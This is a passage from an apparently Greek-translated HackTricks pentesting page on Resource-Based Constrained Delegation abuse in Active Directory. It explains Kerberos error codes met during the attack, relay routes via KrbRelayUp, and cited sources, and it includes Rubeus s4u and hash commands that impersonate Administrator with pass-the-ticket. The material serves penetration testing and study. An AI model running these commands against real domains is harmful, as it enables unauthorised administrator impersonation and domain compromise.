- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos έχει ρυθμιστεί να μη χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το RC4 hash. Δώστε στο Rubeus τουλάχιστον το AES256 hash (ή δώστε του απλώς τα RC4, AES128 και AES256 hashes). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** κατά τη χρήση του `-self` για έναν κανονικό χρήστη: η principal που εκτελεί την delegation πιθανότατα **δεν έχει SPN**. Δοκιμάστε ξανά το **τελευταίο hop** ως **`S4U2Self+U2U`** αντί για κανονικό `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** κατά τη χρήση **SPN-less RBCD**: πρόσφατοι DCs ενδέχεται να απορρίψουν τη διαδρομή **RC4-HMAC** που απαιτείται από το τέχνασμα `S4U2Self+U2U` + session-key-substitution. Δοκιμάστε μια κλασική διαδρομή **SPN-backed** RBCD με AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή διαφέρει από την ώρα του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το παρεχόμενο username + hashes δεν λειτουργούν για τη σύνδεση. Ίσως ξεχάσατε να βάλετε το "$" μέσα στο username κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** κατά το S4U2Proxy: Ελέγξτε τους περιορισμούς delegation του impersonated account, τη σημαία forwardable του evidence ticket και αν το classic KCD ή ο RBCD descriptor του στόχου εξουσιοδοτεί αυτό το hop. Πρόκειται για **σφάλμα πολιτικής delegation του KDC**, όχι για έλεγχο του αν εκτελείται η υπηρεσία-στόχος ή του αν ο χρήστης έχει πρόσβαση σε επίπεδο εφαρμογής. Ένα μη καταχωρισμένο target SPN συνήθως προκαλεί **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Σημειώσεις, relays και εναλλακτικές

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω του AD Web Services (ADWS), αν το LDAP είναι φιλτραρισμένο. Δείτε:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι αλυσίδες Kerberos relay συχνά καταλήγουν σε RBCD για να επιτύχουν local SYSTEM με ένα βήμα. Δείτε πρακτικά παραδείγματα από άκρο σε άκρο:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **απενεργοποιημένο** και μπορείτε να δημιουργήσετε machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να κάνουν relay ένα coerced Kerberos auth στο LDAP, να ορίσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο computer object του στόχου και να κάνουν αμέσως impersonate τον **Administrator** μέσω S4U από off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Κουνώντας τον σκύλο: Κατάχρηση του Resource-Based Constrained Delegation για επίθεση στο Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Μια ακόμη λέξη για το Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Υποκλοπή Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Κατάχρηση του Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Το Kerberosity σκότωσε το Domain: Μια επιθετική επισκόπηση του Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (επίσημο)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Σύντομο Linux cheatsheet με πρόσφατη σύνταξη](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (απενεργοποιημένο LDAP signing → Kerberos relay σε RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - Εξερευνώντας το RBCD μεταξύ domains και forests](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - Εξερευνώντας το RBCD μεταξύ domains και forests: μέρος 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Κλάδος Synacktiv Impacket - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Επισκόπηση του Kerberos constrained delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self μεταξύ domains](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Εντοπισμός και αντιμετώπιση χρήσης RC4 στο Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Λεπτομέρειες S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Exploiting RBCD με κανονικό λογαριασμό χρήστη](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Κατάχρηση του Constrained Delegation χωρίς Protocol Transition έναντι λογαριασμών χωρίς SPN](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Κατάχρηση του Constrained Delegation χωρίς Protocol Transition έναντι λογαριασμών χωρίς SPN](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy με U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Χρήση του ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Ενεργοποίηση καταγραφής συμβάντων Kerberos](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
